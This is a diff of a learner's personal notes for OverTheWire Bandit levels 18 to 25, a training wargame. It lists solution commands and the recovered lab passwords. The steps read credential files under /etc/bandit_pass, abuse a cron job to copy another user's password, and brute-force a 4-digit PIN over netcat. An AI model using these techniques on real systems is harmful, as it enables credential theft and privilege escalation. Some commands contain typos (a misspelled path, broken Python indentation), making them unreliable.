@@ -54,6 +54,41 @@ get bandit17's private key and use it to ssh
 cat /etc/bandit_pass/bandit17 --> xLYVMN9WE5zQ5vHacb0sZEVqbrp7nBTn
 #lvl17
 bandit17@bandit:~$ cat passwords.old | diff passwords.new - ---> kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd
-#lvl18
-
-
+#lvl18 
+ssh bandit18@bandit.labs.overthewire.org -p 2220 /bin/bash #command after the ssh executes before the fw takes me out
+cat readme ---> IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x
+#lvl19
+./bandit20-do cat /etc/bandit_pass/bandit20 ---> GbKksEFF4yrVs6il55v6gwY5aVje5f0j
+#lvl20 two terminal is needed!
+T1: nc -lp 4000
+T2: ./suconnect 4000
+T1: GbKksEFF4yrVs6il55v6gwY5aVje5f0j
+---> gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
+#lvl21 read files step-by-step
+cat /etc/cron.d/cronjob_bandit22 
+cat /usr/bin/cronjob_bandit22.sh  
+cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+---> Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
+#lvl22 understand how the mytarget variable created
+cat /usr/bin/cronjob_bandit23.sh
+echo I am user bandit23 | md5sum | cut -d ' ' -f 1
+cat /tmp/8ca319486bfbbc3663ea0fbe81326349 ---> jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
+#lvl23 don't forget give execution rights! blocked ls is very annoying
+cat /usr/bin/cronjob_bandit24.sh
+mkdir /tmp/getpwd
+chmod 777 getpwd
+echo '#!/bin/bash' > getpwd.sh
+echo 'cat etc/bandit_pass/bandir24 > /tmp/getpwd/pwd24.txt' >> getpwd.sh
+cp getpwd.sh /var/spool/bandit24
+cat pwd24.txt ---> UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+#lvl24
+mkdir /tmp/brute 
+vi brute.py
+    from itertools import product
+    lst = ['0','1','2','3', '4', '5', '6', '7', '8', '9']
+    lst = ["".join(item) for item in product(lst, repeat=4)]
+    with open("PINs.txt", 'a') as f:
+    for i in lst:
+        f.write('UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ ' + i + '\n')
+netcat localhost 30002 < PINs.txt ---> uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+#lvl25
